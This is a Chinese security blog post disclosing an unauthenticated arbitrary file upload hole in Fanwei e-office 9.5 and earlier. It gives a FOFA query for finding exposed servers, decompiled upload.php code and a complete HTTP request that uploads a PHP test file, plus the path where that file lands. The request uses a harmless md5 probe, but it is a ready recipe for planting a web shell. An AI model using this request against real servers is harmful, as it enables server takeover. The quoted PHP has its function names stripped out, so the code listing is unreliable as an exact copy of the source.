---
title: "泛微e-office upload.php 文件上传漏洞"
source: https://mrxn.net/jswz/eoffice-webservice-upload-rce.html
asset_dir: assets/泛微e-office-upload.php-文件上传漏洞
---

# 泛微e-office upload.php 文件上传漏洞

[Mrxn](https://mrxn.net/author/1)- 发表于2025/5/15 08:20
- 1194浏览
- [0评论](#comment)
- 16分钟阅读

深入探索

Web服务

office

软件

---

# 漏洞简介

[泛微](https://mrxn.net/tag/泛微)E-Office是一款标准化的协同 OA 办公[软件](#)，泛微协同办公产品系列成员之一,实行通用化产品设计，充分贴合企业管理需求，本着简洁易用、高效智能的原则，为企业快速打造移动化、无纸化、数字化的办公平台。泛微e-office `webservice/upload.php`、 `webservice/upload/upload.php` 、`webservice-json/upload/upload.php` 和 `webservice-xml/upload/upload.php` 接口存在任意[文件上传](https://mrxn.net/tag/文件上传)漏洞，允许未经身份验证的攻击者上传恶意代码，植入后门，获取服务器权限，并控制整个 Web 服务器。

商务软件和生产力软件

# 影响版本

e-office <=9.5

# fofa语法

> `app="泛微-EOffice"`

# 漏洞分析

由于四个文件的代码相同，这里以 `webservice/upload/upload.php`来看其业务逻辑

```
<?php
include_once( "inc/utility_all.php" );
$pathInfor = ( $_FILES['file']['tmp_name'] );
$extension = $pathInfor['extension'];
$role = UPLOADROLE;
$pos = $extension ? ( $role, ( $extension ) ) : false;
if ( !( $pos === false ) )
{
    echo "false";
}
else
{
    $attachmentID = ( $extension );
    global $ATTACH_PATH;
    $path = $ATTACH_PATH.$attachmentID;
    if ( !( $path ) )
    {
        ( $path, 448 );
    }
    $attachmentName = $_FILES['file']['tmp_name'];
    $fileName = $path."/".$_FILES['file']['name'];
    $fileName = ( "UTF-8", "GBK", $fileName );
    ( $_FILES['file']['tmp_name'], $fileName );
    if ( !( $fileName ) )
    {
        echo "false";
    }
    else
    {
        echo $attachmentID."*".$_FILES['file']['name'];
    }
}
?>
```

可以明显看到，直接进行文件操作，无任何过滤或校验，导致任意文件上传漏洞。

漏洞扫描服务

# 漏洞复现

```
POST /webservice/upload/upload.php HTTP/1.1
Host: eoffice.mrxn.net:8082
Content-Type: multipart/form-data; boundary=----WebKitFormBoundarySIELKZKzD7vQmdsO
Content-Length: 248

------WebKitFormBoundarySIELKZKzD7vQmdsO
Content-Disposition: form-data; name="file"; filename="test.php"

<?=md5(123456);unlink(__FILE__);
------WebKitFormBoundarySIELKZKzD7vQmdsO--
```

深入探索

Web安全书籍

SQL注入防护

安全运维咨询

访问上传文件 `3601032174*test.php` 由响应内容拼接最终路径 `attachment/3601032174/test.php`

[![泛微e-office upload.php 文件上传漏洞](images/img-001-7dc96550bbc8.webp)](https://image.mrxn.net/4719a9f5ebdc42a697364809f4e309b0.webp)

- 标签：
- [#漏洞](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E)
- [#web安全](https://mrxn.net/tag/web%E5%AE%89%E5%85%A8)
- [#代码审计](https://mrxn.net/tag/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1)
- [#rce](https://mrxn.net/tag/rce)
- [#泛微](https://mrxn.net/tag/%E6%B3%9B%E5%BE%AE)
- [#文件上传](https://mrxn.net/tag/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0)

---

文章目录

- [1.漏洞简介](#toc-1-)
- [2.影响版本](#toc-2-)
- [3.fofa语法](#toc-3-)
- [4.漏洞分析](#toc-4-)
- [5.漏洞复现](#toc-5-)

  
  

![](data:image/png;base64,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)

手机扫码阅读
